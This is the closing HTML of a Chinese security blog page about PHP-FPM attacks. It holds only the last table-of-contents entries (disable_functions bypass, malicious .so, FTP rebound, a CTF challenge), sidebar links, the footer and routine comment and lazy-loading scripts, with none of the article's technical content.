href="#%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9A%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">11.0.0.1.</span> <span class="toc-text">姿势一：写入文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9A%E8%AF%BB%E5%8F%96%EF%BC%8C%E5%86%99%E5%9B%9E%E6%96%87%E4%BB%B6"><span class="toc-number">11.0.0.2.</span> <span class="toc-text">姿势二：读取，写回文件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Efsockopen-%E7%9A%84%E9%AA%9A%E5%A7%BF%E5%8A%BF"><span class="toc-number">12.</span> <span class="toc-text">基于fsockopen()的骚姿势</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unix-Socket%E4%B8%8B%E7%9A%84df%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">Unix Socket下的df绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F-so"><span class="toc-number">13.0.0.1.</span> <span class="toc-text">构造恶意.so</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exp%E7%BC%96%E5%86%99"><span class="toc-number">13.0.0.2.</span> <span class="toc-text">Exp编写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8FTP%E5%8F%8D%E5%BC%B9"><span class="toc-number">13.0.0.3.</span> <span class="toc-text">利用FTP反弹</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-Echohub"><span class="toc-number">14.</span> <span class="toc-text">*CTF Echohub</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">15.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">16.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="TryHackMe_1"/></a><div class="content"><a class="title" href="/2022/12/04/TryHackMe_1/" title="TryHackMe_1">TryHackMe_1</a><time datetime="2022-12-04T12:08:57.000Z" title="发表于 2022-12-04 20:08:57">2022-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP2 request smuggling"/></a><div class="content"><a class="title" href="/2022/11/25/HTTP2%20request%20smuggling/" title="HTTP2 request smuggling">HTTP2 request smuggling</a><time datetime="2022-11-25T04:12:08.000Z" title="发表于 2022-11-25 12:12:08">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/6d280d2dfe7be6116b88c3b564148f2.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="HTTP走私靶场"/></a><div class="content"><a class="title" href="/2022/11/16/HTTP%E8%B5%B0%E7%A7%81%E9%9D%B6%E5%9C%BA/" title="HTTP走私靶场">HTTP走私靶场</a><time datetime="2022-11-16T14:33:49.000Z" title="发表于 2022-11-16 22:33:49">2022-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/11/SQLI/" title="SQL注入"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2022/11/11/SQLI/" title="SQL注入">SQL注入</a><time datetime="2022-11-11T08:20:21.000Z" title="发表于 2022-11-11 16:20:21">2022-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/2193933.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="浅析NodeJS"/></a><div class="content"><a class="title" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS">浅析NodeJS</a><time datetime="2022-11-02T11:35:18.000Z" title="发表于 2022-11-02 19:35:18">2022-11-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By yake-daigua</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">愿你有一天能和你重要的人早日相遇</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'TieUOuIwaBZb4edJcJ1C02ka-gzGzoHsz',
      appKey: 'eJRGo87LLpxMlIWKemPvjBtH',
      avatar: 'monsterid',
      serverURLs: 'https://tieuouiw.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://yake-daigua.top/2022/09/25/PHP-FPM%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/'
    this.page.identifier = '/2022/09/25/PHP-FPM%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/'
    this.page.title = 'PHP-FPM攻击详解'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script src="https://cdn.jsdelivr.net/gh/lete114/CDN/js/upjiang.js"></script><script type="text/javascript" src="/js/fairyDustCursor.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>